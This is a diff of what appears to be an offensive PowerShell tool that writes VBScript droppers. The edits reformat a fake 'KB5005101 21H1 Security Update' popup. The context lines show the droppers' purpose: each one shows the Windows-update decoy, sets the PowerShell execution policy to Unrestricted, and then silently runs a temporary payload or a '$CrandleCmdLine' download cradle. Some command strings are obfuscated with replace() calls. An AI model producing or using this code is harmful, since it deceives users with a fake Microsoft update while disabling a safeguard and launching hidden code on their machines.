@@ -207,7 +207,7 @@ $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
 Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
 set ObjSSLTerminal = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 ObjSSLTerminal.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjSSLTerminal.Run(`"$TechnicDefault_Tmp`"), 0
 WScript.Quit")
@@ -238,7 +238,7 @@ End If
 
 '''''''''''''''''''''
 ' HELP - GENERAL
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 SSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 SSLProvider.Run(`"$TechnicDefault_Tmp`"), 0
@@ -334,7 +334,7 @@ Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 '''''''''''''''''''''
 ' HELP - GENERAL
 set ObjSSLProvider = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 ObjSSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjSSLProvider.Exec(`"$CrandleCmdLine`")
@@ -367,7 +367,7 @@ End If
 '''''''''''''''''''''
 ' HELP - GENERAL
 set ObjMicrosoftDisclamer = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 ObjMicrosoftDisclamer.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")
@@ -401,7 +401,7 @@ End If
 '''''''''''''''''''''
 ' HELP - GENERAL
 set ObjMicrosoftDisclamer = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 Set objFSO = CreateObject(`"Scripting.FileSystemObject`")
 objStartFolder = `"C:\Users\Public`"
